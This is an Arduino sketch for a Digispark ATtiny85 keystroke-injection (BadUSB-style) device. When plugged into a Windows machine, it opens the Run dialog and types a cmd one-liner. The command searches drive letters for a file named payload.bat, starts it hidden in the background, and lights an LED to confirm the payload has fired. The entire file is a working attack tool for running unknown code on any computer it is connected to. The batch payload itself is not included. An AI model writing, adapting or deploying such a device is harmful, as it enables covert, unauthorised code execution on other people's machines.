#include "DigiKeyboard.h"

// Built-in LED: Pin 1 for Digispark Model A (rev 1/2), Pin 0 for Model B
#define LED_PIN 1

void setup() {
  pinMode(LED_PIN, OUTPUT);
}

void loop() {
  // 1. Enumeration delay with visual LED heartbeat (~4 seconds)
  // Allows the OS to detect both the ATtiny85 HID and the USB Mass Storage partition
  for (int i = 0; i < 4; i++) {
    digitalWrite(LED_PIN, HIGH);
    DigiKeyboard.delay(500);
    digitalWrite(LED_PIN, LOW);
    DigiKeyboard.delay(500);
  }

  // 2. Open Run dialog (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(700);

  // 3. Resilient command with retry loop: scans drive letters until payload.bat is found
  DigiKeyboard.print("cmd /c \"for /l %i in (1,1,10) do @(for %d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do @if exist %d:\\payload.bat (start \"\" /b %d:\\payload.bat & exit)) & ping -n 2 127.0.0.1 >nul\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // 4. Turn LED solid ON: visual confirmation that payload has been triggered
  digitalWrite(LED_PIN, HIGH);

  // Passive infinite loop to prevent re-execution
  for (;;) {}
}